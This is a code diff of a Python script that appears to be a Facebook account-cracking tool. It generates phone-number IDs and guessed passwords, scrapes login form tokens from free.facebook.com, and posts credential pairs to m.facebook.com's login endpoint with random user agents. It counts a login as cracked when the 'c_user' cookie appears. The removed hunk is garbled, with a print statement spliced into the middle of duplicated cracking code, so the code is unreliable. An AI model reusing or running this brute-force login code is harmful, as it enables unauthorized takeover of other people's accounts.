@@ -187,37 +187,7 @@ def v2():
         print(logo)
         tl = str(len(user))
         print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m SIM CODE : '+kode)
-        print('\033[1;31m[\033[1;32m=\033[1;3guru')
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080']
-            akash.submit(rcrack1,uid,pwx,tl)
-    print(linex)
-    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
-    print(linex)
-#--------------------------(MATHOD BOX)--------------------------#
-def rcrack1(uid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sMr.Roton\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
-            sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            1m]\x1b[38;5;46m CRACK ID : '+tl)
+        print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m CRACK ID : '+tl)
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
         for guru in user:
             uid = kode+kodex+kod+guru
@@ -267,6 +237,7 @@ def rcrack1(uid,pwx,tl):
             "sec-fetch-user": '?1',
             "upgrade-insecure-requests": '1',
             "user-agent": pro}
+
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
